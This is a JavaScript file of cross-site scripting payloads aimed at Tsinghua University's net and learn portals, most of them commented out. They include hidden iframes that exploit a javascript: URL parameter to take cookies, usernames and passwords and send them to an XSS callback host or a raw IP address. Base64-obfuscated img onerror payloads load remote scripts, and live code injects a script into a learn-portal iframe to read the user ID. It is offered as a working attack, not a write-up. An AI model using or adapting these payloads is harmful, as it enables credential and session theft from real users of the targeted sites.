// function my_collect_page_data( path ) {
//     try {
//         var full_url = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(document.cookie)"
//         var xhr = new XMLHttpRequest();
//         xhr.onreadystatechange = function() {
//             if (xhr.readyState == XMLHttpRequest.DONE) {
//                 page_data = {
//                     "page_html": xhr.responseText,
//                     "uri": full_url
//                 }
//                 send_collected_page( page_data );
//             }
//         }
//         xhr.open('GET', full_url, true);
//         xhr.send(null);
//     } catch ( e ) {
//     }
// }

// for( var i = 0; i < collect_page_list.length; i++ ) {
//     // Make sure the path is correctly formatted
//     // if( collect_page_list[i].charAt(0) != "/" ) {
//     //     collect_page_list[i] = "/" + collect_page_list[i];
//     // }
//     my_collect_page_data( collect_page_list[i] );
// }

// try {
//     // var full_url = "//" + document.domain + ":8081" + "/admin.php"
//     var full_url = "net.tsinghua.edu.cn/wireless/?url=javascript:(document.cookie)"
//     var xhr = new XMLHttpRequest();
//     xhr.onreadystatechange = function() {
//         if (xhr.readyState == XMLHttpRequest.DONE) {
//             page_data = {
//                 "page_html": xhr.responseText,
//                 "uri": full_url
//             }
//             send_collected_page( page_data );
//         }
//     }
//     xhr.open('GET', full_url, true);
//     xhr.send(null);
// } catch ( e ) {
// }




// <iframe src="http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass})))" style="display: none"/>

// </textarea><img style="display:none" src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaWdvb2R2ZWdldGFibGUueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>

// <img style="display:none" src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9MZWFybkhlbHBlci9MZWFybkhlbHBlci9hLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>

function loaded() {
    var a=document.getElementById('test3').contentDocument.createElement('script');
    a.textContent="setTimeout(()=>{alert(document.getElementsByName('userid')[0].value)}, 1000)";
    document.getElementById('test3').contentDocument.body.appendChild(a);
}

var ele3 = document.createElement('IFRAME')
ele3.src = "http://learn.tsinghua.edu.cn"
ele3.id = "test3"
// ele3.style = "display: none"
document.children[0].appendChild(ele3)
setTimeout(() => {
    loaded()
}, 1000)


// var ele = document.createElement('IFRAME')
// ele.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt})))"
// ele.style = "display: none"
// document.children[0].appendChild(ele)

// var ele2 = document.createElement('IFRAME')
// ele2.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'http://166.111.68.92/save?'+cdt+'%26'+uname+'%26'+pass, true), xmlHttp.send(null))"
// ele2.style = "display: none"
// document.children[0].appendChild(ele2)